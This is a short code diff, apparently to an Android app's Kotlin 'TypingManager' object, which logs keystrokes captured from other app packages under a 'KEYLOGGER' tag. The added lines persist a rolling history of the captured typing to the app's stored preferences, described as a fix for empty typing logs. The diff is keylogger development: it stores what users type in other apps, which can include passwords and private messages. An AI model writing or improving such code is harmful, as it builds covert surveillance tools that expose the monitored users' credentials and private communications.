@@ -72,6 +72,10 @@ object TypingManager {
         DumpManager.appendLog("KEY", entry)
         DumpManager.logVerification("KEYLOGGER", pkg)
         
+        // SAVE TO CACHE (Fix for empty typing logs)
+        if (history.length() > 100) history.remove(0)
+        prefs.edit().putString("typing_history", history.toString()).apply()
+        
         lastPkg = pkg
         lastTs = now
     }
